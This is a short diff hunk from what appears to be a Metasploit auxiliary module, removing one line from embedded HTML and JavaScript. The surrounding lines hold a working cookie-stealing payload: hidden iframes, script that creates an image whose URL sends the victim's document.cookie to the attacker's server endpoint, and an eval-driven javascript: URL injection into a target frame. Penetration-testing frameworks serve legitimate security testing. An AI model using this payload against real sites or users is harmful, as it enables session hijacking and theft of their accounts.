@@ -104,7 +104,6 @@ class Metasploit3 < Msf::Auxiliary
 <iframe style="display:none" src="#{get_resource}/redirect.php"></iframe>
 <iframe style="display:none" src="#{datastore['TARGET_URI']}"></iframe>
 <script>
-    w = window.frames[0];
     var payload = "var e = document.createElement('img'); e.src='#{server_uri}/#{ninja_cookie_stealer_name}?data=' + encodeURIComponent(document.cookie);"
     top[0].eval('_=top[1];with(new XMLHttpRequest)open("get","#{get_resource}/sleep.php",false),send();_.location="javascript:%22%3Cscript%3E'+ encodeURIComponent(payload) +'%3C%2Fscript%3E%22"');
 </script>
